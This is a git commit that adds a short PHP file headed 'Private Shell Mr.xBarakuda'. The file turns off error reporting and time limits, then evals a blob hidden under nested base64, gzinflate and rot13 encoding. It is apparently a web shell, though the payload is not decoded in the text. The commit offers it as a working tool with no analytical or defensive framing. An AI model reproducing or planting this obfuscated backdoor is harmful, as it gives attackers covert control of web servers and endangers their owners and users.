c0aa761d26c1b1cfb7f8aa76a95b90fba54b4c69
mrxbarakuda <32748674+mrxbarakuda@users.noreply.github.com>
2018-02-25 00:16:55 +0700

    Create kuda_mini.php

---
+++ kuda_mini.php
@@ -0,0 +1,10 @@
+<?php
+################################
+#  Private Shell Mr.xBarakuda  #
+################################
+session_start();
+error_reporting(0);
+set_time_limit(0);
+date_default_timezone_set('Asia/Jakarta');
+eval(gzinflate(str_rot13(gzinflate(base64_decode("AfAAD/8NwcllgjAAANB/8VGHgywFZ21FFk6Bslfl4gSyoCUiVQjy9e17dQKtQJbbA7dgUcJ4HK5QN8qqQ4EX0j+vENUdUcJ3X7vQ7Dx+2EwxYO2PDvzSlcMhscX4tUw7d5A0nOJwgo8So9BHlzaC/tk7We1J3v6Swe7p7BqG77jICY5uYOMntR626Jg3f+I6kypekTp93vP5zXHlQeU6+tYX3xlYLelPBirx0ica4fIOwvTU6I299BeyoSUmkqS4lgXuydst4Cb2z3YdRaUwVcaZnXhss8+zYUmDMGIuU7OOs356lN4pQWRHeWIKxtxNffz7+gM=")))));
+?>
